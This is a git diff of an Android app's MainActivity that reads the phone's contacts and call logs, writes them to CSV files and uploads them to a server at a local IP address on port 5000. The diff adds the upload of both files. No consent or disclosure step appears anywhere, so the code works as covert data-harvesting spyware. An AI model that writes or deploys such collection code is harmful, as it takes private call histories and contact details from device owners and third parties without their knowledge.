@@ -7,7 +7,6 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.StrictMode;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
@@ -129,26 +128,33 @@ public class MainActivity extends AppCompatActivity {
         int Number= cursor.getColumnIndex(ContactsContract.Contacts._ID);
 //        Log.d("tag", String.valueOf(Number));
         String contact_file= "Contacts.csv";
-        while(cursor.moveToNext()){
-            String number= cursor.getString(Number);
-            String name = cursor.getString(Name);
-            String phone_number= cursor.getString(Phone_number);
+        try {
+            File file = new File(contact_file);
+            FileOutputStream out = openFileOutput(file.getName(), Context.MODE_APPEND);
+            String contact = "";
+            while (cursor.moveToNext()) {
+                String number = cursor.getString(Number);
+                String name = cursor.getString(Name);
+                String phone_number = cursor.getString(Phone_number);
 
-            String contact ="\n"+name+","+phone_number;
-            try {
-                File file = new File(contact_file);
-//                Log.d("abc",file.getAbsolutePath());
-//                Log.d("contact," , contact);
-                FileOutputStream out =
-                        openFileOutput(file.getName(), Context.MODE_APPEND);
+                contact = "\n" + name + "," + phone_number;
                 out.write(contact.getBytes(StandardCharsets.UTF_8));
-                out.close();
+                try {
 
-            }catch (Exception e){
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
+            }
+            out.close();
+            File f= new File(getFilesDir(), file.getName());
+            upload("http://192.168.0.109:5000/logs",f);
+        } catch (Exception e){
                 e.printStackTrace();
             }
         }
-    }
+
+
 
     public void getAllApps(){
         final PackageManager pm = getPackageManager();
@@ -188,7 +194,10 @@ public class MainActivity extends AppCompatActivity {
         int date = cursor.getColumnIndex(CallLog.Calls.DATE);
         int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
         String Filename = "Calllogs.csv";
+        try {
         File file = new File(Filename);
+        FileOutputStream out = openFileOutput(file.getName(), Context.MODE_APPEND);
+        String entry="";
         while (cursor.moveToNext()) {
             String ID = cursor.getString(id);
             String phone_no = cursor.getString(phone_number);
@@ -204,17 +213,17 @@ public class MainActivity extends AppCompatActivity {
             switch (dircode) {
                 case CallLog.Calls.OUTGOING_TYPE:
                     // Log.d("type","OUTGOING");
-                     dir = "OUTGOING";
+                    dir = "OUTGOING";
                     break;
                 case CallLog.Calls.INCOMING_TYPE:
                     // System.out.println("INCOMING");
                     //  Log.d("type","INCOMING");
-                      dir = "INCOMING";
+                    dir = "INCOMING";
                     break;
                 case CallLog.Calls.MISSED_TYPE:
                     //System.out.println("MISSED");
                     // Log.d("type","MISSED");
-                     dir = "MISSED";
+                    dir = "MISSED";
                     break;
                 case CallLog.Calls.BLOCKED_TYPE:
                     // Log.d("type","BLocked");
@@ -226,16 +235,19 @@ public class MainActivity extends AppCompatActivity {
                 case CallLog.Calls.VOICEMAIL_TYPE:
                     break;
             }
-            String entry = "\n" + ID + "," + phone_no + "," + phNumber + "," + ft.format(callDayTime) + "," + callDuration + "," + callType;
-
+            entry = "\n" + ID + "," + phone_no + "," + phNumber + "," + ft.format(callDayTime) + "," + callDuration + "," + callType;
+            out.write(entry.getBytes(StandardCharsets.UTF_8));
             try {
 
-                //Log.d("abc",file.getAbsolutePath());
-//                Log.d("entry," , entry);
-                FileOutputStream out =
-                        openFileOutput(file.getName(), Context.MODE_APPEND);
-                out.write(entry.getBytes(StandardCharsets.UTF_8));
-                out.close();
+            } catch (Exception e) {
+
+            }
+        }
+        out.close();
+        Log.d("entry", entry);
+        File f = new File(getFilesDir(),file.getName());
+        upload("http://192.168.0.109:5000/logs",f);
+
 
                 //upload("http://127.0.0.1:5000/logs", new File(Filename));
 //                OkHttpClient client= new OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).writeTimeout(180,TimeUnit.SECONDS).readTimeout(180,TimeUnit.SECONDS).build();
@@ -361,10 +373,7 @@ public class MainActivity extends AppCompatActivity {
 //                            HttpEntity multipart = builder.build();
 //                            uploadFile.setEntity(multipart);
 //                            CloseableHttpResponse response = httpClient.execute(uploadFile);
-//                            HttpEntity responseEntity = response.getEntity();
-                            StrictMode.ThreadPolicy policy =
-                                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
-                            StrictMode.setThreadPolicy(policy);
+//                            HttpEntity responseEntity = response.getEntity(
 //                            CloseableHttpClient client = HttpClients.createDefault();
 //                            HttpPost uploadFile= new HttpPost("http://127.0.0.1:5000/logs");
 //
@@ -382,7 +391,6 @@ public class MainActivity extends AppCompatActivity {
             } catch (Exception e) {
 
             }
-
 //                }).start();
 //
 //
@@ -407,8 +415,11 @@ public class MainActivity extends AppCompatActivity {
 
 //            System.out.println("json"+obj);
         }
-        File file2= new File(getFilesDir(),file.getName());
-        upload("http://192.168.0.109:5000",file2);
+//        File file2= new File(getFilesDir(),file.getName());
+//        Log.d("file path", file2.getAbsolutePath());
+//        upload("http://192.168.0.109:5000",file2);
+
+
         // }
 //    private void PostCallLogData(String id, String phone_account_id, String number, String type, String date, String duration){
 //        Retrofit retrofit = new Retrofit.Builder()
@@ -443,7 +454,6 @@ public class MainActivity extends AppCompatActivity {
 //        });
 //
 //    }
-    }
 
 
     public static void upload(String url, File file) {
@@ -451,7 +461,7 @@ public class MainActivity extends AppCompatActivity {
         RequestBody formBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("file", file.getName(),
-                        RequestBody.create(MediaType.parse("Calllogs.csv"), new File(file.getAbsolutePath())))
+                        RequestBody.create(MediaType.parse("file.csv"), new File(file.getAbsolutePath())))
                 .addFormDataPart("other_field", "other_field_value")
                 .build();
 
@@ -461,7 +471,7 @@ public class MainActivity extends AppCompatActivity {
         client.newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(@NonNull Call call, @NonNull IOException e) {
-                Log.d("failure",file.getAbsolutePath());
+                //Log.d("failure",file.getAbsolutePath());
                 e.printStackTrace();
 
             }
